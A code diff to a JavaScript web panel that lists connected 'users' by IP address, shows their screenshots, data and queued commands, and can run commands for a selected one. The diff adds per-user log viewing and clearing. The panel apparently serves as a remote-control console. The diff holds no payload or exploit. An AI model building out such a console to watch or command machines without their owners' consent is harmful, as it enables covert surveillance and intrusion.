@@ -20,12 +20,14 @@ var $show_screenshots = null;
 var $cmd = null;
 var $cmds = null;
 var $data = null;
+var $userlog = null;
 var $log = null;
 var $run_selected = null;
 
 var $mode_text = null;
 var $mode_color = null;
 var $mode_linebreaks = null;
+var $mode_notime = null;
 
 function show_screenshots() {
 	if (b_screenshots_shown) {
@@ -41,7 +43,7 @@ function show_screenshots() {
 		$('#container_top')
 			.css('whiteSpace', 'normal')
 			.css('overflow', 'visible');
-		$screenshots.css('maxHeight', 'none');
+		$screenshots.css('minHeight', '140px');
 	}
 }
 
@@ -52,6 +54,9 @@ function oncheck_color() {
 	select_user(l_selected);
 }
 function oncheck_linebreaks() {
+	select_user(l_selected);
+}
+function oncheck_notime() {
 	select_user(l_selected);
 }
 
@@ -82,6 +87,10 @@ function convert_mode_linebreaks(txt) {
 	txt = txt.replace(/\;/g, ';\n');
 	return txt;
 }
+function convert_mode_notime(txt) {
+	txt = txt.replace(/\[(.*?)\] /g, '');
+	return txt;
+}
 function log(msg) {
 	$log.get(0).value += msg + '\n';
 	$log.scrollTop($log[0].scrollHeight);
@@ -100,6 +109,12 @@ function set_cmds(data) {
 		data = convert_mode_linebreaks(data);
 	}
 	$cmds.val(data);
+}
+function set_userlog(data) {
+	if ($mode_notime.is(':checked')) {
+		data = convert_mode_notime(data);
+	}
+	$userlog.val(data);
 }
 function refresh_users() {
 
@@ -121,13 +136,14 @@ function refresh_users() {
 			l_times.push(data[i][1]);
 			$users.append($('<tr></tr>')
 				.append('<td><button onclick="select_user('+i+');">Select</button></td>')
-				.append('<td><button onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
+				.append('<td><button style="min-width: 120px" onclick="select_user('+i+');">' + l_users[i] + '</button></td>')
 				.append('<td>' + l_times[i] + '</td>')
 				//.append('<td><button onclick="get_data('+i+')">Show Data</button></td>')
 				//.append('<td><button onclick="view_cmds('+i+')">View Commands</button></td>')
 				.append('<td><button onclick="view_info('+i+')">View Info</button></td>')
 				.append('<td><button onclick="clear_data('+i+')">Clear Data</button></td>')
 				.append('<td><button onclick="clear_cmds('+i+')">Clear Commands</button></td>')
+				.append('<td><button onclick="clear_userlog('+i+')">Clear Log</button></td>')
 				.append('<td><button onclick="del_data('+i+')">Delete User</button></td>'));
 		}
 		log('Fetched ' + l_users.length + ' IP addresses.');
@@ -143,11 +159,13 @@ function select_user(index) {
 		$run_selected.attr('disabled', 'disabled');
 		$data.val('');
 		$cmds.val('');
+		$userlog.val('');
 	} else {
 		$users.find('tr').eq(index).addClass('highlight');
 		$run_selected.text('Run for ' + l_users[index]).removeAttr('disabled');
 		get_data(index);
 		view_cmds(index);
+		view_userlog(index);
 	}
 }
 function get_data(index) {
@@ -190,6 +208,20 @@ function clear_info(index) {
 		log('Cleared info for ' + l_users[index]);
 	});
 }
+function view_userlog(index) {
+	generic_request(index, 'get_log', function(data) {
+		log('Fetched log for ' + l_users[index]);
+		set_userlog(data);
+	});
+}
+function clear_userlog(index) {
+	generic_request(index, 'clear_log', function(data) {
+		log('Cleared log for ' + l_users[index]);
+		if (l_selected == index) {
+			$userlog.val('');
+		}
+	});
+}
 function del_data(index) {
 	if(!confirm('Are you sure?'))
 		return;
@@ -199,6 +231,7 @@ function del_data(index) {
 		if (l_selected == index) {
 			$data.val('');
 			$cmds.val('');
+			$userlog.val('');
 		}
 		refresh_users();
 	});
@@ -361,11 +394,13 @@ $(document).ready(function() {
 	$cmd = $('#cmd');
 	$data = $('#data');
 	$cmds = $('#cmds');
+	$userlog = $('#userlog');
 	$log = $('#log');
 	$run_selected = $('#run_selected');
 	$mode_text = $('#mode_text');
 	$mode_color = $('#mode_color');
 	$mode_linebreaks = $('#mode_linebreaks');
+	$mode_notime = $('#mode_notime');
 	
 	refresh_users();
 	list_screenshots();
